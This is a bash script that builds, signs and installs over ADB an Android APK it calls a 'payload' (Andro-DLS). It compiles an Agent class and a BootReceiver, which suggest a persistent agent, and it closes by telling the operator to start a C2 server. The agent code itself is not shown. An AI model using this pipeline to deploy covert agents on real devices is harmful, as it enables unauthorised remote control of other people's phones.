#!/usr/bin/env bash
# Andro-DLS payload build + deploy script
# Run from: /home/div-admin/geek-div/tools-haydra/Andro-DLS/payload
set -e

PAYLOAD_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$PAYLOAD_DIR"

ANDROID_HOME="${ANDROID_HOME:-$HOME/Android/Sdk}"
BUILD_TOOLS="$ANDROID_HOME/build-tools/34.0.0"
JAVA_RT="$(find /usr/lib/jvm -name rt.jar 2>/dev/null | head -1)"

echo "[*] ANDROID_HOME=$ANDROID_HOME"
[ -x "$BUILD_TOOLS/d8" ] || { echo "[!] d8 not found at $BUILD_TOOLS"; exit 1; }
[ -n "$JAVA_RT" ] || { echo "[!] rt.jar not found"; exit 1; }

echo "[*] Compiling Java..."
rm -rf build/classes && mkdir -p build/classes
javac -source 1.8 -target 1.8 \
  -bootclasspath "$JAVA_RT" \
  -d build/classes \
  src/com/androdls/Agent.java \
  src/com/androdls/MainActivity.java \
  src/com/androdls/BootReceiver.java
echo "[+] Java compiled"

echo "[*] Converting to dex..."
"$BUILD_TOOLS/d8" --output build/classes.dex build/classes && echo "[+] dex ready"

echo "[*] Building unsigned APK via aapt2 + zip..."
mkdir -p build/apk
"$BUILD_TOOLS/aapt2" compile -o build/apk/res.zip res/values/strings.xml 2>/dev/null || true
"$BUILD_TOOLS/aapt2" link -o build/apk/unsigned.apk \
  --manifest AndroidManifest.xml \
  -I "$ANDROID_HOME/platforms/android-34/android.jar" \
  build/apk/res.zip 2>/dev/null || true

# Fallback: manually assemble if aapt2 link failed
mkdir -p build/apk_un
cd build/apk_un
unzip -o ../apk/unsigned.apk >/dev/null 2>&1 || true
cp ../classes.dex classes.dex
cd "$PAYLOAD_DIR"
# Simple jar-based APK assemble (classes.dex + manifest + resources)
cd build/classes
zip -r "$PAYLOAD_DIR/build/apk/final_unsigned.apk" . >/dev/null
cd "$PAYLOAD_DIR"
# Add manifest + resources into the APK
cd build/apk
zip -u final_unsigned.apk AndroidManifest.xml 2>/dev/null || true
cd ../../..
echo "[+] APK assembled: build/apk/final_unsigned.apk"

echo "[*] Align + sign..."
"$BUILD_TOOLS/zipalign" -p 4 build/apk/final_unsigned.apk build/apk/aligned.apk
"$BUILD_TOOLS/apksigner" sign \
  --key "$HOME/.android/debug.keystore" \
  --key-pass pass:android \
  --out agent.apk build/apk/aligned.apk
echo "[+] Signed APK: agent.apk"

echo "[*] Deploying via ADB..."
adb install -r agent.apk && echo "[+] Installed" || echo "[!] ADB install failed"
adb shell am start -n com.androdls/.MainActivity 2>/dev/null || true
echo "[*] Done. Start C2 server with: python3 c2_server.py"
